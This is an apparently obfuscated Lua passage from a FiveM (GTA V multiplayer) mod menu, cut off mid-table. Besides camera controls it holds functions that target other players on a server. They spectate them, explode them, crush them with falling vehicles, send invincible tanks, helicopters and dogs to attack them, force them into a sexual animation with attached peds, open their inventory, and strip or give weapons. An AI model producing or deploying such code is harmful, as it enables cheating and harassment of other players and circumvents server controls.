        function ToggleFreeFlyMode(nlbZmT)
            RC6324gatFukuiW30Q = nlbZmT
        end
        function GetEntityInFrontOfCam()
            local h3RuZd0YHShkmCGl = GetCamCoord(MId7ylF56Gng4srxPxe)
            local f9 = {
                x = h3RuZd0YHShkmCGl.x - Sin(EzfCS) * 100.0,
                y = h3RuZd0YHShkmCGl.y + Cos(EzfCS) * 100.0,
                z = h3RuZd0YHShkmCGl.z + Sin(uLy_yMvZtZN) * 100.0
            }
            local mtObec5 =
                StartShapeTestRay(
                h3RuZd0YHShkmCGl.x,
                h3RuZd0YHShkmCGl.y,
                h3RuZd0YHShkmCGl.z,
                f9.x,
                f9.y,
                f9.z,
                10,
                0,
                0
            )
            local oQly, z9L6MaLMUeanV, XC5, DDHJHXTPnHRyEjN, vvDTI0m50Q = GetShapeTestResult(mtObec5)
            return vvDTI0m50Q
        end
        function ToggleCharacterControl(etPYHm2iHn3eb4)
            LmL2iu0_0 = etPYHm2iHn3eb4
        end
        function ToggleAttachMode()
            if (not Lb8cPEqkMxi0cs_Amf_) then
                LJP0IIkAqCHm8DD = GetEntityInFrontOfCam()
                if (DoesEntityExist(LJP0IIkAqCHm8DD)) then
                    rBAumogi01Hhc3o =
                        GetOffsetFromEntityGivenWorldCoords(LJP0IIkAqCHm8DD, GetCamCoord(MId7ylF56Gng4srxPxe))
                    Citizen.Wait(1)
                    local aM4aBjGiS6HK = GetCamCoord(MId7ylF56Gng4srxPxe)
                    AttachCamToEntity(
                        MId7ylF56Gng4srxPxe,
                        LJP0IIkAqCHm8DD,
                        GetOffsetFromEntityInWorldCoords(
                            LJP0IIkAqCHm8DD,
                            aM4aBjGiS6HK.x,
                            aM4aBjGiS6HK.y,
                            aM4aBjGiS6HK.z
                        ),
                        true
                    )
                    Lb8cPEqkMxi0cs_Amf_ = true
                end
            else
                ClearFocus()
                DetachCam(MId7ylF56Gng4srxPxe)
                Lb8cPEqkMxi0cs_Amf_ = false
            end
        end
        function TogglePointing(pN_)
            if (pN_ and Lb8cPEqkMxi0cs_Amf_) then
                F = true
                PointCamAtEntity(MId7ylF56Gng4srxPxe, LJP0IIkAqCHm8DD, 0.0, 0.0, 0.0, 1)
            else
                F = false
                StopCamPointing(MId7ylF56Gng4srxPxe)
            end
        end
        function ApplyFilter(adCecXaBL)
            SetTimecycleModifier(Cfg.filterList[adCecXaBL])
            a3R841Sms8A9 = adCecXaBL
        end
        function ChangeFilterIntensity(UMiApnyh)
            SetTimecycleModifier(Cfg.filterList[a3R841Sms8A9])
            SetTimecycleModifierStrength(tonumber(zleQSNJa2MIXT[UMiApnyh]))
            Fb = UMiApnyh
        end
        function ResetFilter()
            ClearTimecycleModifier()
            h9M40bqWBrMNGDbG._Index = 1
            a3R841Sms8A9 = 1
            cU1A8qp._Index = 10
            Fb = 10
        end
        if (Cfg.useCommand) then
            RegisterCommand(
                Cfg.command,
                function(k2, HJnVeVLN, O)
                    if (not Cfg.usePermissions or (Cfg.usePermissions and Ca8Ht)) then
                        if (not qc0gHAB7:Visible()) then
                            GenerateCamMenu()
                            qc0gHAB7:Visible(true)
                        end
                    else
                        print("No permission to use this command!")
                    end
                end
            )
        end
        function CinematicCam()
            Citizen.Wait(75)
            GenerateCamMenu()
            qc0gHAB7:Visible(true)
        end
    end
)
local function mHl()
    local g9UadooH37xGXr6a = {}
    for i = 0, 1000 do
        if NetworkIsPlayerActive(i) then
            g9UadooH37xGXr6a[#g9UadooH37xGXr6a + 1] = i
        end
    end
    return g9UadooH37xGXr6a
end
local function wQzbQh7bL9PfVNQEzo()
    local dDz = {}
    for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
            dDz[#dDz + 1] = GetPlayerServerId(i)
        end
    end
    return dDz
end
local AxG = false
local function VZ(xI4Ahn58DuN29MA3)
    local ij1fo1g01oEVnL = PlayerPedId()
    AxG = not AxG
    local fGWMnJufjadYF = GetPlayerPed(xI4Ahn58DuN29MA3)
    if (AxG) then
        local RypEpcrDo, v, D0xD6 = table.unpack(GetEntityCoords(fGWMnJufjadYF, false))
        RequestCollisionAtCoord(RypEpcrDo, v, D0xD6)
        NetworkSetInSpectatorMode(true, fGWMnJufjadYF)
        CahvwB3vGb("Spectating ~b~" .. S2J(xI4Ahn58DuN29MA3) .. "~s~.")
    else
        local J2d24D, atjdjrWxlB24, CXgtvp = table.unpack(GetEntityCoords(fGWMnJufjadYF, false))
        RequestCollisionAtCoord(J2d24D, atjdjrWxlB24, CXgtvp)
        NetworkSetInSpectatorMode(false, fGWMnJufjadYF)
        CahvwB3vGb("Stopped Spectating ~b~" .. S2J(xI4Ahn58DuN29MA3) .. "~s~.")
    end
end
local function hXijPW(ir8YLuR)
    local QxwcSGYW = "stt_prop_stunt_soccer_ball"
    while not HasModelLoaded(GetHashKey(QxwcSGYW)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(QxwcSGYW))
    end
    local uubziEUgv = CreateObject(GetHashKey(QxwcSGYW), 0, 0, 0, true, true, false)
    SetEntityVisible(uubziEUgv, 0, 0)
    AttachEntityToEntity(
        uubziEUgv,
        GetPlayerPed(ir8YLuR),
        GetPedBoneIndex(GetPlayerPed(ir8YLuR), 57005),
        0,
        0,
        -1.0,
        0,
        0,
        0,
        false,
        true,
        true,
        true,
        1,
        true
    )
    CahvwB3vGb("Demi-Godmode on player active~s~!")
end
local function cwlHj9lWLRyOZ(xD7RGcs9NYtkm)
    local j = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
    SetEntityCoords(j, GetEntityCoords(GetPlayerPed(xD7RGcs9NYtkm)), 0.0, 0.0, 0.0, false)
    CahvwB3vGb("Teleported to ~b~" .. S2J(xD7RGcs9NYtkm) .. "~s~.")
end
local function O8b(WxvnICj)
    AddExplosion(GetEntityCoords(GetPlayerPed(WxvnICj)), 0, 10.0, true, false, 100000.0)
    CahvwB3vGb("Exploded ~b~" .. S2J(WxvnICj) .. "~s~.")
end
local function Nc6XH8N5hbtH9ijtm(EY2KZL)
    local kWkvGWqMgjs = GetPlayerPed(EY2KZL)
    local T_eCx2VP5Eoq = kR3tkcBRzWGoBkSE("Enter Vehicle Model Name to explode", "", 100)
    if T_eCx2VP5Eoq and IsModelValid(T_eCx2VP5Eoq) and IsModelAVehicle(T_eCx2VP5Eoq) then
        RequestModel(T_eCx2VP5Eoq)
        while not HasModelLoaded(T_eCx2VP5Eoq) do
            Citizen.Wait(0)
        end
        local nhTZJfX =
            CreateVehicle(
            GetHashKey(T_eCx2VP5Eoq),
            GetEntityCoords(kWkvGWqMgjs),
            GetEntityHeading(kWkvGWqMgjs),
            true,
            true
        )
        NetworkExplodeVehicle(nhTZJfX, true, false, false)
        CahvwB3vGb("Spawned & Exploded ~b~" .. T_eCx2VP5Eoq .. "~s~ besides ~b~" .. S2J(EY2KZL) .. "~s~.")
    else
        CahvwB3vGb("~r~Model is not valid!")
    end
end
local function vQg(lFtw)
    local cdcKI6Vly9Cxd = "a_c_cat_01"
    while not HasModelLoaded(GetHashKey(cdcKI6Vly9Cxd)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(cdcKI6Vly9Cxd))
    end
    for i = 0, 10 do
        CreateObject(GetHashKey(cdcKI6Vly9Cxd), GetEntityCoords(GetPlayerPed(lFtw)), true, false, false)
    end
end
local function _FL19AX4sqtr5Q06f6G(K9)
    Citizen.CreateThread(
        function()
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(K9), true) then
                local u6jtdorUyonanXA = GetVehiclePedIsIn(GetPlayerPed(K9), true)
                while not NetworkHasControlOfEntity(u6jtdorUyonanXA) do
                    NetworkRequestControlOfEntity(u6jtdorUyonanXA)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(u6jtdorUyonanXA, true, true)
                DeleteVehicle(u6jtdorUyonanXA)
                DeleteEntity(u6jtdorUyonanXA)
            end
            count = -0.2
            for b = 1, 3 do
                local T_TIJ95h3fY, s7tIKBa, wU2w = table.unpack(GetEntityCoords(GetPlayerPed(K9), true))
                local uVXUTsj5PrrW2nD =
                    CreatePed(4, GetHashKey("a_m_o_acult_01"), T_TIJ95h3fY, s7tIKBa, wU2w, 0.0, true, false)
                SetEntityAsMissionEntity(uVXUTsj5PrrW2nD, true, true)
                AttachEntityToEntity(
                    uVXUTsj5PrrW2nD,
                    GetPlayerPed(K9),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(K9))
                TaskPlayAnim(GetPlayerPed(K9), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetPedKeepTask(uVXUTsj5PrrW2nD)
                TaskPlayAnim(uVXUTsj5PrrW2nD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(uVXUTsj5PrrW2nD, true)
                count = count - 0.4
            end
        end
    )
end
local function RQSl_fZbUVBS(DPL3w5Jc)
    TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(DPL3w5Jc), GetPlayerName(DPL3w5Jc))
end
local function nlI6d(yAXcq9QZZnuwZ_PYyC)
    local nG = GetEntityCoords(GetPlayerPed(yAXcq9QZZnuwZ_PYyC), true)
    local NGa0pFgPYT1 = kR3tkcBRzWGoBkSE("Enter Object Spawn Name", "", 100)
    if NGa0pFgPYT1 ~= "" and IsModelValid(NGa0pFgPYT1) then
        local K5A7L2cG037ZnFzZoB = GetHashKey(NGa0pFgPYT1)
        RequestModel(K5A7L2cG037ZnFzZoB)
        while not HasModelLoaded(K5A7L2cG037ZnFzZoB) do
            Citizen.Wait(0)
        end
        local DrKYFaoYnetQZ = CreateObject(K5A7L2cG037ZnFzZoB, nG.x, nG.y, nG.z, true, false, true)
        if sticked then
            AttachEntityToEntity(
                DrKYFaoYnetQZ,
                GetPlayerPed(yAXcq9QZZnuwZ_PYyC),
                GetPedBoneIndex(GetPlayerPed(yAXcq9QZZnuwZ_PYyC), 57005),
                0.4,
                0,
                0,
                0,
                270.0,
                60.0,
                true,
                true,
                true,
                true,
                1,
                true
            )
            CahvwB3vGb("Spawned & sticked object on player.")
        else
            CahvwB3vGb("Spawned object on player.")
        end
    else
        CahvwB3vGb("Invalid object name!")
    end
end
local function vPkvoubzBCI4XOjNUGZZB(WOwB4GIGuyisJF, XO)
    if (XO ~= "" and IsModelValid(XO)) then
        local xPgOsBBdIClSvU = GetPlayerPed(WOwB4GIGuyisJF)
        local orqU3McU6 = GetEntityCoords(xPgOsBBdIClSvU, true)
        local zIj7hqGl2jGitJ48uVvmW = GetHashKey(XO)
        RequestModel(zIj7hqGl2jGitJ48uVvmW)
        while not HasModelLoaded(zIj7hqGl2jGitJ48uVvmW) do
            Citizen.Wait(0)
        end
        local KQ = CreateObject(zIj7hqGl2jGitJ48uVvmW, orqU3McU6.x, orqU3McU6.y, orqU3McU6.z, true, false, true)
        AttachEntityToEntity(
            KQ,
            xPgOsBBdIClSvU,
            GetPedBoneIndex(xPgOsBBdIClSvU, 57005),
            0.4,
            0,
            0,
            0,
            270.0,
            60.0,
            true,
            true,
            true,
            true,
            1,
            true
        )
        CahvwB3vGb("Attached object to player.")
    else
        CahvwB3vGb("Something went wrong, model is wrong.")
    end
end
local function DY56ICJ(cXBnTHl0)
    local fn = GetPlayerPed(cXBnTHl0)
    local EwXGjJKsyJEW5d8uxL1oa = GetEntityCoords(fn, true)
    local hetr3yrFP7YgfIKd1 = GetHashKey("insurgent2")
    RequestModel(hetr3yrFP7YgfIKd1)
    while not HasModelLoaded(hetr3yrFP7YgfIKd1) do
        Citizen.Wait(0)
    end
    local BKWDuCUUoFvNZ_noTh1wu =
        CreateVehicle(
        GetHashKey("insurgent2"),
        EwXGjJKsyJEW5d8uxL1oa.x,
        EwXGjJKsyJEW5d8uxL1oa.y,
        EwXGjJKsyJEW5d8uxL1oa.z + 20.0,
        0.0,
        true,
        false
    )
    SetEntityVelocity(BKWDuCUUoFvNZ_noTh1wu, 0.0, 0.0, -100.0)
    CahvwB3vGb("Spawned car above player and smashed him.")
end
local function ZT0FIlMa(Jx1EJdCek9Fiq)
    local oxpYURNxu15aG = GetPlayerPed(Jx1EJdCek9Fiq)
    local sRwUDj5_xNx = GetEntityCoords(oxpYURNxu15aG, true)
    local TLthaJ = GetHashKey("insurgent2")
    local lTowRKAmo = GetEntityHeading(oxpYURNxu15aG)
    RequestModel(TLthaJ)
    while not HasModelLoaded(TLthaJ) do
        Citizen.Wait(0)
    end
    local YQPa33_ =
        CreateVehicle(
        GetHashKey("insurgent2"),
        sRwUDj5_xNx.x,
        sRwUDj5_xNx.y,
        sRwUDj5_xNx.z + 100.0,
        lTowRKAmo,
        true,
        false
    )
    SetEntityVelocity(YQPa33_, 0.0, 0.0, -5000.0)
    CahvwB3vGb("Spawned car above player and smashed him ~r~HARDER.")
end
function SpawnRhinoP(KkKk7ik0SgDH)
    local AVcCSe4o1FakU = GetPlayerPed(KkKk7ik0SgDH)
    local fxgC2Z6 = GetEntityCoords(AVcCSe4o1FakU, true)
    local oV8pVH = GetHashKey("rhino")
    RequestModel(oV8pVH)
    while not HasModelLoaded(oV8pVH) do
        Citizen.Wait(0)
    end
    local AZ6ASOOdpjWesyr33Ea =
        CreateVehicle(
        oV8pVH,
        fxgC2Z6.x + math.random(0, 360),
        fxgC2Z6.y + math.random(0, 360),
        fxgC2Z6.z + 5.0,
        GetEntityHeading(AVcCSe4o1FakU),
        true,
        false
    )
    RequestControlOnce(AZ6ASOOdpjWesyr33Ea)
    local jWMuHW7MYZnBNEAt8AZ3 = "a_m_y_skater_01"
    local lWoCgsCfyAJyrSs = GetHashKey(jWMuHW7MYZnBNEAt8AZ3)
    local VGNb = GetEntityCoords(swathash)
    RequestModel(lWoCgsCfyAJyrSs)
    while not HasModelLoaded(lWoCgsCfyAJyrSs) do
        RequestModel(lWoCgsCfyAJyrSs)
        Citizen.Wait(50)
    end
    local S = CreatePedInsideVehicle(AZ6ASOOdpjWesyr33Ea, 4, lWoCgsCfyAJyrSs, -1, true, false)
    RequestControlOnce(S)
    SetDriverAbility(S, 100.0)
    TaskCombatPed(S, AVcCSe4o1FakU, 0, 16)
    SetCurrentPedVehicleWeapon(S, GetHashKey("VEHICLE_WEAPON_TANK"))
    CahvwB3vGb("A wild tank spawned somewhere near the player, time to kill.")
end
function SpawnHeliP(mi7zCDIwFC)
    local FRznPVG = GetPlayerPed(mi7zCDIwFC)
    local gwFaNpcUgn3, fvboJy9ugykx, naUfHf = table.unpack(GetEntityCoords(FRznPVG))
    local Ndc2HR3d01tmAFdpjId = "buzzard"
    local H9ya730d_ = "ig_claypain"
    RequestModel(Ndc2HR3d01tmAFdpjId)
    RequestModel(H9ya730d_)
    while not HasModelLoaded(Ndc2HR3d01tmAFdpjId) do
        Citizen.Wait(0)
    end
    while not HasModelLoaded(H9ya730d_) do
        Citizen.Wait(0)
    end
    local ueR =
        CreateVehicle(
        GetHashKey(Ndc2HR3d01tmAFdpjId),
        gwFaNpcUgn3 + math.random(0, 360),
        fvboJy9ugykx + math.random(0, 360),
        naUfHf + 100.0,
        GetEntityHeading(FRznPVG) + 90.0,
        true,
        false
    )
    local oXiCrBrOlkzo01wq10VU = CreatePedInsideVehicle(ueR, 4, H9ya730d_, -1, true, false)
    SetHeliBladesFullSpeed(ueR)
    TaskCombatPed(oXiCrBrOlkzo01wq10VU, FRznPVG, 0, 16)
    SetCurrentPedVehicleWeapon(oXiCrBrOlkzo01wq10VU, GetHashKey("VEHICLE_WEAPON_PLAYER_BUZZARD"))
    local v2wVNZm5HaMWuP2V = PedToNet(oXiCrBrOlkzo01wq10VU)
    NetworkSetNetworkIdDynamic(v2wVNZm5HaMWuP2V, false)
    SetNetworkIdCanMigrate(v2wVNZm5HaMWuP2V, true)
    SetNetworkIdExistsOnAllMachines(v2wVNZm5HaMWuP2V, true)
    Citizen.Wait(30)
    NetToPed(v2wVNZm5HaMWuP2V)
    SetEntityInvincible(v2wVNZm5HaMWuP2V, true)
    local xMDBg = "a_m_y_skater_01"
    local iikAr6cVdg = "WEAPON_ASSAULTRIFLE"
    for i = 1, 3 do
        RequestModel(GetHashKey(xMDBg))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(xMDBg)) then
            local NQ5NDOjbqadzPCAp7xSR = CreatePedInsideVehicle(ueR, 4, H9ya730d_, i, true, false)
            NetworkRegisterEntityAsNetworked(NQ5NDOjbqadzPCAp7xSR)
            if DoesEntityExist(NQ5NDOjbqadzPCAp7xSR) and not IsEntityDead(FRznPVG) then
                local LERf5GtHrph6pd = PedToNet(NQ5NDOjbqadzPCAp7xSR)
                NetworkSetNetworkIdDynamic(LERf5GtHrph6pd, false)
                SetNetworkIdCanMigrate(LERf5GtHrph6pd, true)
                SetNetworkIdExistsOnAllMachines(LERf5GtHrph6pd, true)
                Citizen.Wait(100.0)
                NetToPed(LERf5GtHrph6pd)
                GiveWeaponToPed(NQ5NDOjbqadzPCAp7xSR, GetHashKey(iikAr6cVdg), 9999, 1, 1)
                SetEntityInvincible(NQ5NDOjbqadzPCAp7xSR, true)
                SetCurrentPedWeapon(NQ5NDOjbqadzPCAp7xSR, GetHashKey(iikAr6cVdg), true)
                TaskCombatPed(NQ5NDOjbqadzPCAp7xSR, FRznPVG, 0, 16)
            elseif IsEntityDead(GetPlayerPed(mi7zCDIwFC)) then
                TaskCombatHatedTargetsInArea(NQ5NDOjbqadzPCAp7xSR, gwFaNpcUgn3, fvboJy9ugykx, naUfHf, 500)
            else
                Citizen.Wait(0)
            end
        end
    end
    CahvwB3vGb("A wild heli with 3 guys spawned somewhere near the player, time to kill.")
end
function SpawnLazerP(W4hC)
    local fb = GetPlayerPed(W4hC)
    local NRuQlQ2ckIT8z0nP = GetEntityCoords(fb, true)
    local J4wtW2_OOhjRlfKITwAg = GetHashKey("lazer")
    local A = GetEntityHeading(fb)
    local OKhks2L7 = "ig_claypain"
    RequestModel(J4wtW2_OOhjRlfKITwAg)
    while not HasModelLoaded(J4wtW2_OOhjRlfKITwAg) do
        Citizen.Wait(0)
    end
    local IZYFnuRlzG7BP =
        CreateVehicle(
        GetHashKey("lazer"),
        NRuQlQ2ckIT8z0nP.x,
        NRuQlQ2ckIT8z0nP.y,
        NRuQlQ2ckIT8z0nP.z + 200.0,
        A,
        true,
        false
    )
    SetEntityRotation(IZYFnuRlzG7BP, -90.0, 0.0, 0.0, 0, true)
    SetEntityVelocity(IZYFnuRlzG7BP, 0.0, 0.0, -5000.0)
    SetVehicleForwardSpeed(IZYFnuRlzG7BP, 3000.0)
    CahvwB3vGb("Spawned lazer above player and smashed him.")
end
animal = "a_c_rottweiler"
function SpawnDogsP(a83v_W8EBoe8eeO)
    for i = 1, 5 do
        local PC_v7JxBh9rV4NTd = GetEntityCoords(GetPlayerPed(a83v_W8EBoe8eeO))
        RequestModel(GetHashKey(animal))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(animal)) then
            local _1k8IZTIF3jIwmsOiE =
                CreatePed(
                21,
                GetHashKey(animal),
                PC_v7JxBh9rV4NTd.x + i + 5.0,
                PC_v7JxBh9rV4NTd.y - i - 5.0,
                PC_v7JxBh9rV4NTd.z,
                0,
                true,
                true
            )
            NetworkRegisterEntityAsNetworked(_1k8IZTIF3jIwmsOiE)
            if not IsEntityDead(GetPlayerPed(a83v_W8EBoe8eeO)) then
                local qXRWU2ESPJRZ = PedToNet(_1k8IZTIF3jIwmsOiE)
                NetworkSetNetworkIdDynamic(qXRWU2ESPJRZ, false)
                SetNetworkIdCanMigrate(qXRWU2ESPJRZ, true)
                SetNetworkIdExistsOnAllMachines(qXRWU2ESPJRZ, true)
                Citizen.Wait(500)
                NetToPed(qXRWU2ESPJRZ)
                SetEntityInvincible(_1k8IZTIF3jIwmsOiE, true)
                TaskCombatPed(_1k8IZTIF3jIwmsOiE, GetPlayerPed(a83v_W8EBoe8eeO), 0, 16)
            elseif IsEntityDead(GetPlayerPed(a83v_W8EBoe8eeO)) then
                TaskCombatHatedTargetsInArea(
                    _1k8IZTIF3jIwmsOiE,
                    PC_v7JxBh9rV4NTd.x,
                    PC_v7JxBh9rV4NTd.y,
                    PC_v7JxBh9rV4NTd.z,
                    500
                )
            else
                Citizen.Wait(0)
            end
        end
    end
end
function TPPlayer(nKZg2dY_Ns)
    local VpX1JNwR = GetPlayerPed(nKZg2dY_Ns)
    RequestControlOnce(VpX1JNwR)
    local tNvcvRSozGhP = kR3tkcBRzWGoBkSE("Enter X pos", "", 100)
    local BlPx5nlI = kR3tkcBRzWGoBkSE("Enter Y pos", "", 100)
    local nUCreQhAF1c = kR3tkcBRzWGoBkSE("Enter Z pos", "", 100)
    if tNvcvRSozGhP ~= "" and BlPx5nlI ~= "" and nUCreQhAF1c ~= "" then
        SetEntityCoords(VpX1JNwR, tNvcvRSozGhP + 0.01, BlPx5nlI + 0.01, nUCreQhAF1c + 0.01, false, false, false, false)
        CahvwB3vGb(
            "Player should be at x: ~r~" ..
                tNvcvRSozGhP .. "~s~; y: ~r~" .. BlPx5nlI .. "~s~; z: ~r~" .. nUCreQhAF1c .. "~s~ !"
        )
    else
        CahvwB3vGb("~r~Invalid ~s~coords!")
    end
end
function SilentKillP(gwL9UYQYCxoFC4zJx)
    AddExplosion(GetEntityCoords(GetPlayerPed(gwL9UYQYCxoFC4zJx)), 8, 3000.0, false, true, 0.0)
end
local nzq1bZLKDy7Ze0_ = {
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_MICROSMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_STINGER",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL"
}
local function D(EkDwvrY18ZTN)
    for i = 1, #nzq1bZLKDy7Ze0_ do
        GiveWeaponToPed(GetPlayerPed(EkDwvrY18ZTN), GetHashKey(nzq1bZLKDy7Ze0_[i]), 1000, false, false)
    end
end
local function hk7qI02(U4zRG874l5pym_e)
    for i = 1, #nzq1bZLKDy7Ze0_ do
        RemoveWeaponFromPed(GetPlayerPed(U4zRG874l5pym_e), GetHashKey(nzq1bZLKDy7Ze0_[i]))
    end
end
local function ch(XAjztGlN)
    if (XAjztGlN == nil) then
        return
    end
    for i = 1, #nzq1bZLKDy7Ze0_ do
        if string.lower(XAjztGlN) == string.lower(nzq1bZLKDy7Ze0_[i]) then
            return true
        end
    end
    return false
end
ammocount = 20
local function FO3YdQ(m8A)
    local fXy61bdOYwdQjIYYoocLD = GetPlayerPed(m8A)
    local KNi7H9fAEyh9FmYy15T = kR3tkcBRzWGoBkSE("Enter Weapon Spawn Name", "weapon_", 100)
    if
        ch(KNi7H9fAEyh9FmYy15T) and KNi7H9fAEyh9FmYy15T ~= nil and KNi7H9fAEyh9FmYy15T ~= "" and
            KNi7H9fAEyh9FmYy15T ~= " "
     then
        GiveWeaponToPed(fXy61bdOYwdQjIYYoocLD, GetHashKey(KNi7H9fAEyh9FmYy15T), ammocount, false, true)
        CahvwB3vGb(
            "Gave ~b~" ..
                S2J(m8A) ..
                    "~s~ a ~b~" .. string.sub(KNi7H9fAEyh9FmYy15T, 8) .. " ~s~with ~b~" .. ammocount .. " ~s~ammo."
        )
    else
        CahvwB3vGb("~r~Weapon is not valid!")
    end
end
local function QpaGPqHEnx_()
    local QPwiI = GetPlayerPed(-1)
    local xReyg2 = GetVehiclePedIsIn(QPwiI, true)
    local AVT98d7NF5nIQ1BLfbZ2I = kR3tkcBRzWGoBkSE("Enter the plate license you want", "", 100)
    if AVT98d7NF5nIQ1BLfbZ2I ~= "" then
        SetVehicleNumberPlateText(xReyg2, AVT98d7NF5nIQ1BLfbZ2I)
        CahvwB3vGb("Successfully change plate to : ~b~" .. AVT98d7NF5nIQ1BLfbZ2I)
    end
end
local function Nu2cAusL()
    local Dw3YEl2Ao31Sda = GetPlayerPed(-1)
    if IsPedSittingInAnyVehicle(Dw3YEl2Ao31Sda) then
        local hqTjWwkpAlxeNUutk1 = GetVehiclePedIsIn(Dw3YEl2Ao31Sda, false)
        ApplyForceToEntity(hqTjWwkpAlxeNUutk1, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
    else
        CahvwB3vGb("You must be in a vehicle to do that !")
    end
end
local function GIJpTR80GNE8Bfxsnkenu()
    local vXdmdSqDr_kYjdB0 = GetPlayerPed(-1)
    if IsPedSittingInAnyVehicle(vXdmdSqDr_kYjdB0) then
        local Ghl9177SLCh = GetVehiclePedIsIn(vXdmdSqDr_kYjdB0, false)
        ApplyForceToEntity(Ghl9177SLCh, 3, 0.0, 0.0, 6.8, 0.0, -270.0, 0.0, 0, 0, 1, 1, 0, 1)
    else
        CahvwB3vGb("You must be in a vehicle to do that !")
    end
end
local function xEBBXSHGE()
    local AXeQgCCk3YwGN2CDqHT = GetPlayerPed(-1)
    if IsPedSittingInAnyVehicle(AXeQgCCk3YwGN2CDqHT) then
        local lZ = GetVehiclePedIsIn(AXeQgCCk3YwGN2CDqHT, false)
        ApplyForceToEntity(lZ, 3, 0.0, 0.0, 6.8, 0.0, 360.0, 0.0, 0, 0, 1, 1, 0, 1)
    else
        CahvwB3vGb("You must be in a vehicle to do that !")
    end
end
local function A1cfgejMd94j_AIO1p0()
    local wy7 = GetHashKey("xs_prop_hamburgher_wl")
    for kJOIjL_9U7i3zG45 in EnumerateVehicles() do
        local VdAlO = CreateObject(wy7, 0, 0, 0, true, true, true)
        AttachEntityToEntity(VdAlO, kJOIjL_9U7i3zG45, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
    end
end
local function JDpTz3ykUoTwq7LUy4KFo()
    local OH_kNL = GetPlayerPed(-1)
    if not IsPedSittingInAnyVehicle(OH_kNL) then
        local N4mHaiyzvtMq5doW = GetHashKey("flatbed")
        RequestModel(N4mHaiyzvtMq5doW)
        while not HasModelLoaded(N4mHaiyzvtMq5doW) do
            Citizen.Wait(0)
        end
        local dJ3X_Ff1yKYzxD4UVIpt1 =
            CreateVehicle(N4mHaiyzvtMq5doW, GetEntityCoords(OH_kNL), GetEntityHeading(OH_kNL), true, false)
        SetPedIntoVehicle(OH_kNL, dJ3X_Ff1yKYzxD4UVIpt1, -1)
        local RH6PiLu0bq91MZOQkx19 = GetHashKey("prop_juicestand")
        RequestModel(RH6PiLu0bq91MZOQkx19)
        while not HasModelLoaded(RH6PiLu0bq91MZOQkx19) do
            Citizen.Wait(0)
        end
        local Nk = GetEntityCoords(N4mHaiyzvtMq5doW)
        balls = {
            ball0 = {-4.794678, 0, 2},
            ball1 = {-2.411841, 0, 2},
            ball2 = {-0.3234975, 0, 2},
            ball3 = {-2.411841, 0.4759895, 3.132111},
            ball4 = {-2.411841, 0.9318889, 4.08304},
            ball5 = {-2.411841, 1.288613, 4.75624},
            ball6 = {-2.411841, 1.677544, 5.353539},
            ball7 = {-2.411841, 2.202592, 6.237866},
            ball8 = {-2.411841, 2.503958, 6.725931},
